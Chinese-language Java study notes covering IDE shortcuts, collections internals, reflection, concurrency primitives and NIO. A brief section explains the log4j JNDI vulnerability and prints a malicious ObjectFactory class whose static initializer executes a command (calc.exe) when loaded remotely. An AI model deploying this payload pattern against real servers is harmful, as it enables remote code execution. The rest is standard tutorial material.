

# JAVA

## 快捷键

| Alt + Insert     | 代码自动生成，如生成对象的 set / get 方法，构造函数，toString() 等 |
| ---------------- | ------------------------------------------------------------ |
| Alt + Enter      | 提供快速修复选择，光标放在的位置不同提示的结果也不同         |
| Ctrl + O         | 选择可重写的方法                                             |
| Shift + Enter    | 开始新一行。光标所在行下空出一行，光标定位到新行位置         |
| Ctrl + Alt + T   | 对选中的代码弹出环绕选项弹出层 （比如增加try-catch块）       |
| Ctrl + Shift + / | 代码块注释                                                   |
| Ctrl + Shift + U | 对选中的代码进行大 / 小写轮流转换 （必备）                   |
| ctrl+H           | 生成类图                                                     |





缩写

| psvm | public static void main(String[] args){} |
| ---- | ---------------------------------------- |
| sout | System.out.println()                     |
| souf | System.out.printf()                      |
| fori | for (int i = 0; i < ; i++) { }           |





## 漏洞

### log4j漏洞

jndi：java命名和目录接口，通过jndi可以在网络上查找对应名字的类等资源。

==该漏洞利用log4j的递归解析，使得jdni触发，并且导致被攻击服务器从其他不安全的地方下载了class文件到本地执行==

![1639486971846](java.assets/1639486971846.png)

![1639490131296](java.assets/1639490131296.png)

```java
public class BugHa implements ObjectFactory{
    static {
        System.out.println("黑客入侵");
        try {
            Process p  = Runtime.getRuntime().exec("calc.exe");
            p.waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        System.out.println("黑客植入的class");
        return new BugHa();
    }
}
```



## 基础

### Object

所有类的超类

![1637153397488](java.assets/1637153397488.png)

#### equals和hashcode

equals默认是比较两个对象实例的引用，但我们平时更多的用到比较两个对象逻辑上是否相同

那么就需要重写equals方法，一般ide内置了重写这种方法

并且针对哈希表这种存储结构，两个对象在逻辑上相同，那么其hashcode以应该相同，不然的话存到hash表中的数据会因为hashcode不一样而再也找不到。

```java
 @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (!(o instanceof Bread)) return false;
        Bread bread = (Bread) o;
        return Objects.equals(color, bread.color) &&
                Objects.equals(taste, bread.taste);
    }

@Override
    public int hashCode() {

        return Objects.hash(color, taste);
    }
```



#### compareTo和Compartor

compareTo是类继承了Comparble排序接口，相当于内部比较器

Compartor是比较器接口，相当于外部比较器



```java
    public static void main(String[] args) {
        Bread bread = new Bread(5,"read");
        Bread bread1 = new Bread(2,"read");
        Bread bread2 = new Bread(1,"read");
        List<Bread> list = new ArrayList<>();
        list.add(bread);
        list.add(bread1);
        list.add(bread2);
        System.out.println(list);
        Collections.sort(list);
        System.out.println(list);
    }
}
@ToString
class Bread implements Comparable{
    @Override
    public int compareTo(Object o) {
        Bread bread = (Bread)o;
        return this.price>bread.price?1:-1;
    }

    private int price;
```

```java
Comparator<Bread> objectComparator = new Comparator<Bread>(){
            @Override
            public int compare(Bread o1, Bread o2) {
                return o1.getPrice()>o2.getPrice()?1:-1;
            }
        };
        Collections.sort(list,objectComparator);
```



#### Collection和Colletions

Collection是集合类上层接口

![1637155070663](java.assets/1637155070663.png)

Colletions是集合类帮助类，里面写好了很多帮助方法，类似于Executors类





#### Serializable

记住网络传输java对象一定要实现Serializable



Serializable接口是序列化接口，何为序列化

序列化就是把java对象转换为字节流对象方便在网络上传输

==本质上Serializable只是一个标识，用户层面只需要implements就可以了，实际是告诉jvm来处理==

java建议用户需要自己顶一个serialVersionUID变量在类中，当然自己不定义java也会默认给一个，但是默认的对class细节敏感，反序列化时候会比较两个类的序列化id



##### 序列化

序列化在网络协议模型中在OSI中是展示层，展示层主要功能是把应用层对象转换成一段连续的二进制串。

在TCP/IP协议中是应用层的一部分



### BigDecimal

该类实现对浮点类的运算，不会造成精度丢失



注意：我们在使用 `BigDecimal` 时，为了防止精度丢失，推荐使用它的`BigDecimal(String val)`构造方法或者 `BigDecimal.valueOf(double val)` 静态方法来创建对象。

![img](java.assets/image-20211213102222601.png)



### 代理

1. 静态代理（每对一个对象进行代理就需要写一个代理类）
2. 如果加入容器的目标对象有实现接口,用JDK代理
3. 如果目标对象没有实现接口,用Cglib代理





### 泛型

```java
/**
第一个T代表泛型
第二个T代表返回类型
第三个代表传入的参数必须是泛型对应的类型
**/
private <T> T getStudent(List<T> list){
 	return ;
}
```



### 文件

#### 流

> java使用统一的概念处理所有的IO，包括磁盘和网络等



#### 装饰器模式

Java引入了装饰器模式来加强基本流的功能

1. 对流起缓存作用的：BuffedInputStream
2. 对基本数据类型和字符串对流进行操作的：DataInputStream
3. 对流进行压缩：GZIPInputStream



#### Reader和Writer

> InputStream和OutputStream为基类的流基本都是以二进制处理数据，不方便处理文本，没有编码的概念
>
> 提供了新基类Reader和Writer





### 容器

#### Map和Set接口

map对应键值对映射，Set带逻辑去重



##### Hashmap

内部有个hash表，即数组table，每个元素的table[i]指向一个单向链表，根据键去值，用键计算出hash值，取模得到数组索引中的位置，然后操作对应单向链表。操作单向链表的时候首先根据hash值对比，`如果相同才会对比equals函数，这就要求相同对象应该有相同的hashcode和equals返回值。`



##### hashset

特点

1. 没有重复元素
2. 可以高效添加和删除，自带去重和集合运算
3. 没有顺序



hashset内部维护了一个hashmap对象，只是外部封装了，因为set只有键没有值，他给值封装了默认的对象，让所有键的值都为默认的对象

```java
private transient HashMap<E,Object> map
  
//键的默认值
private static final Object PRESENT = new Object();
```



##### treemap

拥有排序的功能，底层使用红黑树，使用该方法应该传入一个实现Comparator接口的比较器

```java
public TreeMap(Comparator<? super K> comparator)
```

总之，该对象必须拥有比较功能，优先使用比较器，没有比较器就用键对象的compareTo方法



##### treeset

基于treemap实现去重

去重基于比较结果，比较结果为0就判定为相同

内部维护对象如下，`NavigableMap实现类就是treemap`

```java
private transient NavigableMap<E,Object> m;
private static final Object PRESENT = new Object();
```



##### linkedHashmap

内部维护了一个双向链表

带有元素按插入顺序和访问顺序，默认情况下是按插入顺序，插入顺序用途可以用在购物车实现上

访问顺序可以用在缓存上，把访问过的数据放到链表尾部

通过编写子类重新父类`removeEldestEntry`方法可以实现简单的LRU链表

```java
public class ListTest {
    public static void main(String[] args) {
        Cache<String, Integer> list = new Cache<>(3);
        list.put("c",100);
        list.put("a",200);
        list.put("b",140);
        list.get("c");
        list.get("b");
        list.put("d",100);

        for(Map.Entry<String,Integer> entry : list.entrySet()){
            System.out.println(entry.getKey()+" "+entry.getValue());
        }
    }
}
class Cache<K,V> extends LinkedHashMap<K,V>{
    private int maxSize;
    public Cache(int initialCapacity) {
        super(initialCapacity,0.75f,true);
        maxSize = initialCapacity;
    }

    @Override
    protected boolean removeEldestEntry(Map.Entry<K, V> eldest) {
        return size()>maxSize;
    }
}
```



`removeEldestEntry`原理是，每次添加元素后会调用该方法判断，如果为true，会调用`removeEntryForKey`进行删除元素



##### LinkedHashSet

与前面一样，其内部维护了LinkedHashMap对象

然后也是实现了去重功能



#### 堆与优先级队列

##### PriorityQueue

实现了Queue接口，内部用堆实现，物理结构上用动态数组实现

```java
PriorityQueue<Integer> queue = new PriorityQueue<>(Collections.reverseOrder());
        queue.addAll(Arrays.asList(6,4,321,32,7,68));
        while(!queue.isEmpty()){
            System.out.println(queue.poll());
        }
```



插入元素原理如下：

这里会判断是不是数组满了，满了调用`grow`方法，之后看是否第一次添加，是直接插入到数组头部，不是就放在尾部`siftUp`向上寻合适位置

```java
public boolean offer(E e) {
        if (e == null)
            throw new NullPointerException();
        modCount++;
        int i = size;
        if (i >= queue.length)
            grow(i + 1);
        size = i + 1;
        if (i == 0)
            queue[0] = e;
        else
            siftUp(i, e);
        return true;
    }
```



grow方法如下：会把数组长度变为原来长度的两倍，并且复制使用Arrays.copyof

```java
private void grow(int minCapacity) {
        int oldCapacity = queue.length;
        // Double size if small; else grow by 50%
        int newCapacity = oldCapacity + ((oldCapacity < 64) ?
                                         (oldCapacity + 2) :
                                         (oldCapacity >> 1));
        // overflow-conscious code
        if (newCapacity - MAX_ARRAY_SIZE > 0)
            newCapacity = hugeCapacity(minCapacity);
        queue = Arrays.copyOf(queue, newCapacity);
    }
```

向上寻找代码如下，把k设置为数组末尾，然后不断向上寻找位置，直到要插入元素大于父节点元素

```java
while (k > 0) {
            int parent = (k - 1) >>> 1;
            Object e = queue[parent];
            if (comparator.compare(x, (E) e) >= 0)
                break;
            queue[k] = e;
            k = parent;
        }
        queue[k] = x;
```





### 并发容器

#### BlockingQueue

阻塞队列的接口，实现类由`ArrayBlockingQueue`、`LinkedBlockingQueue` 、`PriorityBlockingQueue` 。

ArrayBlockingQueue

> 底层是数组，并发控制采用ReetrantLock

LinkedBlockingQueue

> 底层是链表，使用该结构需要控制大小

PriorityBlockingQueue

> 可以自定义compareTO来制定元素顺序





#### CopyOnWrite

> 写时复制，解决并发问题的重要思路
>
> 适合用在

##### CopyOnWriteArrayList

> 线程安全
>
> 迭代器不支持修改，不抛错，是一种fail-safe
>
> 原子方法支持复合操作

内部维护一个数组，数组以原子方式更新，每次操作都需要新建一个数组，在新数组上修改，然后原子方法设置数组引用



##### CopyOnWriteArraySet

内部维护了CopyOnWriteArrayList

他的添加方法就是调用了list的`addIfAbsent`来去掉重复的数据

```java
public boolean add(E e) {
 return al.addIfAbsent(e);
}
```





#### 基于跳表的map和set

> 带有排序功能，并发容器没有用树而用跳跃表实现，redis也是基于这个实现sortedset



##### CocurrentSkipListMap

> 有序、无锁非阻塞，完全并行，实现复杂度接近二分查找

CocurrentSkipListSet是基于CocurrentSkipListMap来实现的

![Snip20220514_51](java.assets/Snip20220514_51.png)





### 反射和注解

#### 注解

##### 元注解

元注解的作用就是注解其他注解的注解，java定义了4个元注解

包括@Target、@Rentention、@Documented、@Inherited

| @Target     | 描述注解的范围            |
| ----------- | ------------------------- |
| @Rentention | 表示注解生命周期          |
| @Documented | 该注解是否保存在javadoc中 |
| @Inherited  | 是否可以被继承            |



定义注解

```java
public class Test {

    @MyAnnoation
    public void test(){

    }
}

@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
@interface MyAnnoation{
    String name() default "";
}
```

注解实际是需要反射配合使用



#### 反射

有三种方法可以获得class对象

```
//根据类名
Person.class
//根据类实例
person.getClass()
//根据全类名
Class.forName("com.Person")
```



##### 类的加载

1. 加载：把class文件加载到内存中，并将静态数据转换成方法区中，生产Class对象
2. 链接：将java二进制代码合并到jvm中
   1. 验证：确保类信息符合规范
   2. 准备，为类变量分配内存，设置默认值，在方法区中分配
   3. 解析：将符号引用转换成直接引用
3. 初始化：
   1. 执行类初始化器<clinit>：**所有的类变量初始化语句和类型的静态初始化器**static前缀
   2. 当初始化一个类时候，如果父类没有初始化，先初始化父类



类何时初始化

1、主动引用：发生类初始化

主要有new对象和反射加载

2、被动引用：不发生初始化

子类调用父类类常量

创建类数组

访问常量

```java
public class Test {
    public static void main(String[] args) throws Exception{
        System.out.println(Person.a);
    }

}

class Person{

    static {
        System.out.println("被初始化");
    }
    private String name;
    private int age;

    static final int a =5;

}
```





创建对象

```java
 Class<Person> personClass = Person.class;
        //通过class创建对象
        Person person = personClass.newInstance();
        System.out.println(person);
        //通过构造函数创建对象
        Constructor<Person> declaredConstructor = personClass.getDeclaredConstructor(String.class, int.class);
        Person person1 = declaredConstructor.newInstance("留言", 5);
```



通过反射获取方法并调用

```java
		Person person = personClass.newInstance();
        Method setName = personClass.getMethod("setName", String.class);
        setName.invoke(person,"留言11");
        System.out.println(person);
```





通过反射获得注解信息

```
Class<Person> personClass = Person.class;
        //获得类上的注解
        MyAnnoation annotation = personClass.getAnnotation(MyAnnoation.class);
        System.out.println(annotation.value());
        //获得属性上的注解
        Field[] declaredFields = personClass.getDeclaredFields();
        for (Field field:declaredFields){
            MyFiled myFiled = field.getAnnotation(MyFiled.class);
            System.out.println("相加"+(myFiled.a()+myFiled.b()));
        }
        
        
        
        
 @MyAnnoation("liquid")
class Person{
    @MyFiled(a=3,b=3)
    private String name;
    @MyFiled(a=4,b=4)
    private int age;
    public Person(){

    }
    public Person(String name,int age){
        this.name = name;
        this.age = age;
    }

}



@Target(ElementType.TYPE)
@Retention(RetentionPolicy.RUNTIME)
@interface MyAnnoation{
    String value() default "";
}

@Target(ElementType.FIELD)
@Retention(RetentionPolicy.RUNTIME)
@interface MyFiled{
    int a();
    int b();
}
```



### 多线程

#### 进程和线程

| 进程 | 操作系统动态执行的基本单元，既是基本的分配单元，也是基本的执行单元 |
| ---- | ------------------------------------------------------------ |
| 线程 | 作为时间调度的基本单元，共享进程内的资源                     |



#### 线程实现

java中实现线程有两种方式

- 实现Runnable接口

  ```java
  public class ThreadRunn{
  
      public static void main(String[] args) {
          new Thread(new NewRunnable()).start();
      }
  }
  
  class NewRunnable implements Runnable{
      @Override
      public void run() {
          System.out.println("任务执行");
      }
  }
  ```

- 继承Thread重写run（）

  ```java
  public class NewThread extends Thread {
      public static void main(String[] args) {
          new NewThread().start();
      }
  
      @Override
      public void run() {
          System.out.println("继承Thread");
      }
  }
  ```

  *一般来说实现Runnable是更好的选择，可以提高程序的扩展性和灵活性。*

  

  Thread类用来管理线程，如设置线程优先级、设置Daemon属性，读取线程名字和ID

  Thread类默认实现了Runnable接口，并将其构造方法的重载形式允许传入Runnable接口对象作为任务

  Thread在调用start()会触发jvm底层创建新线程执行run（）

  ```
  public class Thread implements Runnable{
  	private Runnable target;
  	public void run() {
          if (target != null) {
              target.run();
          }
      }
  }
  ```



#### 线程状态

```java
public enum State {
	NEW,
	RUNNABLE,
	BLOCKED,
	WAITING,
	TIMED_WAITING,
	TERMINATED;
}
```

各状态区别：

1. Thread.sleep()不会释放对象的锁
2. Object.wait()释放锁和CPU
3. BLOCKED状态使当前线程阻塞，会占有CPU等待抢占锁
4. LockSupport.park(）没有使用锁，不占用CPU

![1636529261496](java.assets/1636529261496.png)



#### 线程安全

为了解决多线程下资源的竞争问题，java提出了一些方法来解决

##### synchronized

基于java底层对每个对象设置了一个监视器锁，当一个线程获得该对象监视器锁后，其他线程无法获得，只有等待。synchronized是一个排他锁



从下面结果可以看到同步方法与非同步方法互相不影响，而同步方法之间会因为一个正在执行，另外一个无法执行

```java
public class ClockTest {
    public static void main(String[] args) {
        Clock clock = new Clock(10);
        new Thread(()->{
            clock.timeout();
        }).start();
        new Thread(()->{
            clock.timeUp();
        }).start();
        new Thread(()->{
            clock.tick();
        }).start();
    }
}
class Clock {

    private int start;

    public Clock(int start) {
        this.start = start;
    }

    public  void timeout(){
        synchronized (this){
            while (start>0){
                System.out.println(Thread.currentThread().getId()+"倒计时:"+start--);
            }
        }
    }

    public  void timeUp(){
        synchronized (this){
            while (start<10){
                System.out.println(Thread.currentThread().getId()+"正计时"+start++);
            }
        }
    }

    public void tick(){
        System.out.println("进入tick");
        while (true){
            System.out.println("ticking");
            try {
                TimeUnit.SECONDS.sleep(1);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

}


11倒计时:10
11倒计时:9
11倒计时:8
11倒计时:7
11倒计时:6
11倒计时:5
11倒计时:4
11倒计时:3
11倒计时:2
11倒计时:1
12正计时0
进入tick
ticking
12正计时1
12正计时2
12正计时3
12正计时4
12正计时5
12正计时6
12正计时7
12正计时8
12正计时9
ticking
ticking
ticking
```



##### jdk常见安全类型

###### vector和arraylist

Vector是线程安全的集合，底层是静态数组，所有方法都加了同步，在高并发下性能很低

ArrayList是jdk为了优化Vector，取消了所有同步方法，底层依然使用静态数组，但并发下会出错



###### StringBuffer和StringBuilder

StringBuffer中的方法都使用了同步方法

StringBuilder取消了同步机制



###### HashMap和ConcurrentHashMap

在jdk1.8中HashMap由数组和链表组成，当链表长度超过8时候，并且数组长度超过64，链表变成红黑树

HashMap没有同步机制，并发下不安全

ConcurrentHashMap使用同步代码块，用于增加线程安全性



#### 线程通信

使用Object的notify和wait方法

使用这两个方法前都需要获得object对象的监视器锁

```java
public class Example {
    public static void main(String[] args) {
        Object object = new Object();
        new Thread(()->{
            for (int i = 0; i < 5; i++) {
                System.out.println(Thread.currentThread().getId()+",i="+i);
                if(i==3){
                    synchronized (object){
                        try {
                            object.wait();
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                }
            }
        }).start();
        new Thread(()->{
            try {
                TimeUnit.SECONDS.sleep(2);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            synchronized (object){
                System.out.println("唤醒计数器");
                object.notify();
            }
        }).start();
    }
}
```



join()方法会让另外一个线程介入当前线程，只有线程执行完或者超时才会回到当前线程继续执行，并且join方法底层是调用了wait方法，所以线程是进入了waiting状态的





#### 死锁

必要条件

|           循环等待           |          一直持有          |
| :--------------------------: | :------------------------: |
|           互斥条件           |     资源只能一个人持有     |
|        资源不能被抢占        | 他人不能抢占已经占有的资源 |
| 线程持有资源并等待另一个资源 |      鱼和熊掌都想兼得      |



#### 线程池

ThreadPoolExecutor类最常用的底层线程类

包括了核心线程、阻塞队列和普通线程

当核心线程能满足任务时候创建对等的核心线程

当不能满足时候，放到阻塞队列，等待核心线程

当阻塞队列装慢后，创建普通线程（**临时线程**）来执行任务，普通线程执行完任务后关闭



如果已经不足以处理新的请求了，需要一些策略解决：

> 传入RejectedExecutionHandler
>
> AbortPolicy 跑出异常
>
> DiscardPolicy 仍掉新请求
>
> DiscardOldesPolicy 仍掉队列最旧的请求
>
> CallerRunsPolicy 只要线程池没关闭，在当前线程执行该任务



![1636794384385](java.assets/1636794384385.png)



##### Executor

线程层顶层接口，只定义了一个执行任务的方法

```java
public interface Executor {
    void execute(Runnable command);
}
```



ExecutorSerivce

在Executor基础上提供了生命周期的方法，供子类实现

```java
public interface ExecutorService extends Executor {
	void shutdown();
    List<Runnable> shutdownNow();
    boolean isTerminated();
    <T> Future<T> submit(Callable<T> task);
    等....
}
```

其中submit方法也是执行任务，只是起会返回Future对象回来，而execute没有返回值

并且submit的入参时Callable，而execute是Runnable



Callable接口提供了call方法调用来从任务中返回值出来

```java
public interface Callable<V> {
    V call() throws Exception;
}
```



Executors

工具类，可以创建各种线程池、线程工厂

线程池如下

| newFixedThreadPool      | 固定线程数量                                                 |
| ----------------------- | ------------------------------------------------------------ |
| newSingleThreadExecutor | 只有一个线程在处理                                           |
| newCachedThreadPool     | 核心线程为0，创建Int整形范围内的工作线程                     |
| newScheduledThreadPool  | 设置延时线程，该类自定义了ScheduledExecutorSerivce，并且将Runnable包装为ScheduledFutureTask，它继承了FutureTask类并且实现了RunnableScheduledTask |
| newWorkStealingPool     | 基于多核CPU，底层使用forkjoin来处理，上层类为ForkJoinPool    |



线程工厂

接口很简单就提供了一个创建线程的方法待子类实现

```java
public interface ThreadFactory {
    Thread newThread(Runnable r);
}
```



并且线程池在创建线程时候其实也是调用了线程工厂来创建的，只是一般都选择默认的线程工厂创建，在其中通过addWork()中的创建Worker构造函数来从线程工厂获取线程对象的

```java
w = new Worker(firstTask);

Worker(Runnable firstTask) {
            setState(-1); // inhibit interrupts until runWorker
            this.firstTask = firstTask;
            this.thread = getThreadFactory().newThread(this);
   }
```



案例如下根据简单工厂创建线程

```java
public static void main(String[] args) {
        ThreadFactory threadFactory = Executors.defaultThreadFactory();
        threadFactory.newThread(()->{
            System.out.println("新线程"+Thread.currentThread().getId());
        });
        System.out.println("主线程"+Thread.currentThread().getId());
    }
```



#### 锁

##### ReetrantLock

可重入锁，用法上与synchronized差不多

```java
class Lock1{
    private final ReentrantLock reentrantLock = new ReentrantLock();

    public void m1(){
        reentrantLock.lock();
        try {
            m2();
        }finally {
            reentrantLock.unlock();
        }
    }
```



与synchroinzed的比较

- 都是互斥锁具有独占性和排斥性
- ReetrantLock是显示，依赖于jdk，而synchronize是隐式，其是java底层内置的锁，依赖于jvm
- ReetrantLock更加灵活拥有扩展性
- ReetrantLock可以与多个监视器配合，而synchronize只能与一个监视器配合



##### Conditon

监视器对象，用法上与Object的wait()和notify一样

对应condition里面的await()和signal()



##### ReentrantReadWriteLock

内部定义了两个锁读锁和写锁，可以用来对数据的并发读写

```java
public class ReentrantReadWriteLock
        implements ReadWriteLock, java.io.Serializable {
    private final ReentrantReadWriteLock.ReadLock readerLock;
    private final ReentrantReadWriteLock.WriteLock writerLock;
```



​                  

#### 阻塞队列

| ArrayBlockingQueue  | 底层是数组，需要显示传入长度，是有界                         |
| ------------------- | ------------------------------------------------------------ |
| LinkedBlockingQueue | 底层是链表，不需要传入长度，是无界                           |
| SynchrouonsQueue    | 底层是空集合，没有长度，只有在插入线程和提取线程同时存在时候，才会传输数据，否则一直阻塞 |
| DelayQueue          | 无界阻塞队列，只有在延迟等待时间到达后才会添加到队列中，否则队列没有元素。实现了Delay接口，改接口继承了Comparble方法提供了排序，并且提供了一个getDelay方法，告知延期还有多长 |

ArrayBlockingQueue和LinkedBlockingQueue，LinkedBlockingQueue的并发性更好因为，他的put和take方法是有两个不同的锁来管理的，相互不影响，而ArrayBlockingQueue是由一个锁来管理两个方法。

```java
LinkedBlockingQueue
/** Lock held by take, poll, etc */
    private final ReentrantLock takeLock = new ReentrantLock();

    /** Wait queue for waiting takes */
    private final Condition notEmpty = takeLock.newCondition();

    /** Lock held by put, offer, etc */
    private final ReentrantLock putLock = new ReentrantLock();

    /** Wait queue for waiting puts */
    private final Condition notFull = putLock.newCondition();
```

阻塞队列在读写数据时候，当前线程阻塞状态使WAITING，当条件满足时候会自动唤醒



#### AQS

AQS全称为AbstractQueuedSynchronizer，该框架提供了一套同步管理通用机制

封装线程为队列节点，CLH是虚拟的双向队列

![AQS原理图](java.assets/AQS原理图.png)

AQS对外暴露了state的值来同步状态，通过对变量使用volatile和方法CAS（compare and set）来保证同步

CAS依赖于CPU底层，适用于多线程下解决变量同步问题

volatile作用是让jvm读取和改变变量时候直接从主存中拿，而不用的情况下是从本地内存拿，而不是直接在主存读写。

```java
private volatile int state;
protected final int getState() {
        return state;
    }
 protected final void setState(int newState) {
        state = newState;
    }
protected final boolean compareAndSetState(int expect, int update) {
        // See below for intrinsics setup to support this
        return unsafe.compareAndSwapInt(this, stateOffset, expect, update);
    }
```

对于并发修改变量，volatile不起作用

| volatile           | synchronize      |
| ------------------ | ---------------- |
|                    | 解决独占性       |
| 线程同步轻量级实现 | 相对重量         |
| 不会阻塞           | 阻塞线程         |
| 只能修饰变量       | 修饰方法和代码块 |



下面是用AQS实现的简单互斥锁

```java
public class Mutux {
    public static void main(String[] args) {
        MyMutux myMutux = new MyMutux();
        ExecutorService pool = Executors.newCachedThreadPool();
        for (int i = 0; i < 100; i++) {
            pool.execute(()->{
                myMutux.lock();

                System.out.println(Thread.currentThread().getId());
                System.out.println(Thread.currentThread().getId()+"锁住当前线程");

                myMutux.unlock();
            });
        }

    }
}
class MyMutux {
    private final Sync sync = new Sync();

    class Sync extends AbstractQueuedSynchronizer {
        {
            this.setState(0);
        }
        @Override
        protected boolean tryAcquire(int arg) {
            return compareAndSetState(0, 1);
        }

        @Override
        protected boolean tryRelease(int arg) {
            setState(0);
            return true;
        }


    }
    public void lock() {
        if (!sync.tryAcquire(0));
    }

    public void unlock() {
        sync.tryRelease(0);
    }
}
```





##### ReetrantLock

下图为基本的AQS独占锁流程，通过内部抽象对象sync控制state状态，sync具体实现看选择共享锁还是非共享锁

![img](java.assets/b8b53a70984668bc68653efe9531573e78636.png)



##### CountDownLatch计数器

java.util.concurrent的包下的类,构造函数输入一个数字后，等待数字对应的任务执行完毕，然后执行最后一个线程

![1636701068311](java.assets/1636701068311.png)

包含了await方法	阻塞当前任务，只有count为0时候，才不会阻塞

​			countDown 每执行完一个任务就减少1

​			getCount

```java
public class CarAssembleExample {
    public static void main(String[] args) {
        CountDownLatch countDownLatch = new CountDownLatch(10);
        LastTask lastTask = new LastTask(countDownLatch);
        new Thread(lastTask).start();
        for (int i = 0; i < 10 ; i++) {
            WorkTask workTask = new WorkTask(countDownLatch,i);
            new Thread(workTask).start();
        }
    }
}
class WorkTask implements Runnable{
    private CountDownLatch countDownLatch;
    private int id;
    public WorkTask(CountDownLatch countDownLatch,int id) {
        this.countDownLatch = countDownLatch;
        this.id = id;
    }

    @Override
    public void run() {
        try {
            TimeUnit.SECONDS.sleep(1);
        } catch (Exception e) {
            e.printStackTrace();
        }
        countDownLatch.countDown();
        System.out.println("id"+id+"配件生产完成");

    }
}
class LastTask implements Runnable{
    private CountDownLatch countDownLatch;

    public LastTask(CountDownLatch countDownLatch) {
        this.countDownLatch = countDownLatch;
    }
    @Override
    public void run() {
        try {
            System.out.println("等待其他配件生产");
            countDownLatch.await();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println("最后组装完毕");
    }
}
```



##### CyclicBarrer

屏障，只有所有线程都调用了await()方法后才能允许下一步工作，用处上来说与CountDownLatch其实一样



##### Semaphore

信号灯，通过设置多个凭证，线程需要通过acquire获取凭证，否则无法执行操作，持续等待，当执行完后release释放凭证

```java
public class SemaphoreTest {
    public static void main(String[] args) {
        Semaphore semaphore = new Semaphore(3);
        for (int i = 0; i < 10; i++) {
            new Thread(new Student(semaphore)).start();
        }
    }
}
class Student implements Runnable{
    private Semaphore semaphore;

    public Student(Semaphore semaphore) {
        this.semaphore = semaphore;
    }

    @Override
    public void run() {
        try {
            semaphore.acquire();
        } catch (InterruptedException e) {
            e.printStackTrace();
        }
        System.out.println(Thread.currentThread().getId()+"实验完成");
        semaphore.release();
    }
}
```





#### ThreadLocal

用该类可以确保每个线程存取自己的相关信息



而下图的t.threadLocals是Thread类对象保存的ThreadLocalMap

```java
public T get() {
        Thread t = Thread.currentThread();
        ThreadLocalMap map = getMap(t);
        if (map != null) {
            ThreadLocalMap.Entry e = map.getEntry(this);
            if (e != null) {
                @SuppressWarnings("unchecked")
                T result = (T)e.value;
                return result;
            }
        }
        return setInitialValue();
        
ThreadLocalMap getMap(Thread t) {
        return t.threadLocals;
    }

```

ThreadLocalMap是静态类

```java
static class ThreadLocalMap {

        /**
         * The entries in this hash map extend WeakReference, using
         * its main ref field as the key (which is always a
         * ThreadLocal object).  Note that null keys (i.e. entry.get()
         * == null) mean that the key is no longer referenced, so the
         * entry can be expunged from table.  Such entries are referred to
         * as "stale entries" in the code that follows.
         */
        static class Entry extends WeakReference<ThreadLocal<?>> {
            /** The value associated with this ThreadLocal. */
            Object value;

            Entry(ThreadLocal<?> k, Object v) {
                super(k);
                value = v;
            }
        }
```



```java
public class ThreadLocalTest {
    public static void main(String[] args) {
        ThreadLocal<Integer> threadLocal = new ThreadLocal<>();
        ExecutorService pool = Executors.newCachedThreadPool();
        for (int i = 0; i < 5; i++) {
            pool.execute(()->{
                int rand = (int)(Math.random()*10);
                threadLocal.set(rand);
                System.out.println(Thread.currentThread().getId()+"  "+rand);
            });
        }
        for (int i = 0; i < 5; i++) {
            pool.execute(()->{
                System.out.println(Thread.currentThread().getId()+" "+threadLocal.get());
            });
        }
    }
}
```

![ThreadLocal数据结构](java.assets/threadlocal数据结构.a0bfadf8.png)



##### 内存泄漏

内存泄漏根源不是因为弱引用，而是在于threadlocalmap的生命周期与线程一样长，并且没有手动删除对应key导致的

如果threadlocal的key没有用弱引用，那么GC的时候甚至不能回收key对象

**如果要解决问题**

> threadlocal本身其实就已经在set和get设置了检查key==null的代码，如果查到了就设置value==null
>
> 手动要在关闭threadlocal的地方remove key

**优化使用**

​	使用static修饰threadlocal，因为threadlocal一般用在某个对象内部，如果不用static，每次都需要创建一个threadlocal**浪费资源**，使用了static，所有外部对象实栗共用一个threadlocal类对象



### 网络编程

#### 异步阻塞

异步是指主线程调用后，由另外一个线程来实际执行

阻塞是指主线程需要等待子线程执行完了才能执行下面的步骤。更仔细的来说，子线程调用结果没有返回，主线程需要挂起等待结果





#### BIO

bio是阻塞的I/O，可以用在并发量不高的网络中



socket通信是网络编程的基本模型，与同步和异步无关，与阻塞和非租塞也无关

分为三步：1、建立连接；2、进行会话；3、关闭连接

基本代码

服务器开启端口，客户端连接端口

```java
#服务器
ServerSocket serverSocket = new ServerSocket(port);
Socket socket = serverSocket.accept();

#客户端
InetSocketAddress inetSocketAddress = new InetSocketAddress(ipAddr,port);
Socket socket = new Socket();
socket.connect(inetSocketAddress,30000);
```



完整的socket通信框架应该有超时设置

- 连接超时

  连接设置了3秒连接，超过了就断开

  ```java
  socket.connect(inetSocketAddress,30000);
  ```

- 读超时

  ```
  socket.setSoTimeout(20000);
  ```

- 写超时

  一般写超时是基于TCP重传机制，不需要自己再设置

  

#### NIO

NIO称为非阻塞式I/O，又称为多路复用

NIO由单线程、Selector、SelectionKey、ServerSocketChannel和SocketChannel组成

服务器开启监听接口后，绑定一个ServerSocketChannel，此只有一个用来处理连接请求与应答，收到连接后，创建SocketChannel来处理数据，以上两个SocketChannel都会有个一个对应的SelectionKey来作为凭证，Selector通过SelectionKey来选择对应通道执行操作



NIO又称为多路复用，能在高并发环境下提高CPU效率，减少线程之间的切换

nio下的read和write是非租塞的，系统通过selector的select方法来轮询检查是否有事件就绪（注意这里是阻塞的，没有事件的话会等地），就绪后就可以处理

![1636205374552](java.assets/1636205374552.png)



NIO三大核心：buffer、channel和Selector

1. 每个Channel对应Buffer
2. 一个Selector对应一个线程，一个线程对应多个Channel
3. 执行哪个Channel由事件Event确定
4. Buffer本质就是内存块，底层是数组
5. 客户端不是把数据直接写到通道，同时客户端也不是直接从通道读取数据，而是把数据写到缓冲区再传到通道，或者从通道读取到缓冲区
6. Channel和Buffer都是双向的

![1639983683695](java.assets/1639983683695.png)

##### Selector

多个Channel以事件的方式注册到Selector中，Selector按事件来进行相应处理,事件类型对应SelectionKey，根据SelctionKey来找到对应Channel





##### Buffer

java在NIO中引入的类型，重要属性

| mark     | 记录了当前标记索引下标       |
| -------- | ---------------------------- |
| position | 当前读取或者写入的位置       |
| limit    | 当前读入或可以写入的最多下标 |
| capacity | 表示当前数组容量大小         |
| array    | 保存当前存入元素             |



==ByteBuff是最重要的子类，本质是对字符数组的封装==

